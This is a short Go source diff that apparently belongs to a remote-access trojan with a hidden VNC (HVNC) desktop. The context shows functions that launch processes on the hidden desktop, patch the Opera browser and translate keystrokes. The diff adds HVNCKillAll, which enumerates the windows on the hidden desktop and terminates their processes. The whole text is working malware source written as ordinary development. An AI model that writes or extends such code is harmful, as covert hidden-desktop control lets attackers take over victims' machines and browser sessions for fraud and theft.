@@ -47,6 +47,8 @@ var (
 	procToUnicode                = user32.NewProc("ToUnicode")
 	procGetWindowPlacement       = user32.NewProc("GetWindowPlacement")
 	procGetWindowThreadProcessId = user32.NewProc("GetWindowThreadProcessId")
+	procEnumDesktopWindows       = user32.NewProc("EnumDesktopWindows")
+	procTerminateProcess         = kernel32.NewProc("TerminateProcess")
 )
 
 const (
@@ -558,6 +560,39 @@ func StartHVNCProcess(filePath string, operaPatch bool) error {
 	if operaPatch && result.pid != 0 {
 		go patchOperaAsync(result.pid, 5, 2*time.Second)
 	}
+	return nil
+}
+
+func HVNCKillAll() error {
+	hvncDesktopMu.Lock()
+	deskHandle := hvncDesktopHandle
+	hvncDesktopMu.Unlock()
+	if deskHandle == 0 {
+		return fmt.Errorf("HVNC desktop not initialized")
+	}
+
+	pids := make(map[uint32]struct{})
+	cb := syscall.NewCallback(func(hwnd, _ uintptr) uintptr {
+		var pid uint32
+		procGetWindowThreadProcessId.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
+		if pid != 0 {
+			pids[pid] = struct{}{}
+		}
+		return 1 // continue enumeration
+	})
+	procEnumDesktopWindows.Call(deskHandle, cb, 0)
+
+	const PROCESS_TERMINATE = 0x0001
+	killed := 0
+	for pid := range pids {
+		hProc, _, _ := procOpenProcess.Call(PROCESS_TERMINATE, 0, uintptr(pid))
+		if hProc != 0 {
+			procTerminateProcess.Call(hProc, 1)
+			kernel32.NewProc("CloseHandle").Call(hProc)
+			killed++
+		}
+	}
+	log.Printf("hvnc: kill all: terminated %d processes across %d pids", killed, len(pids))
 	return nil
 }
 
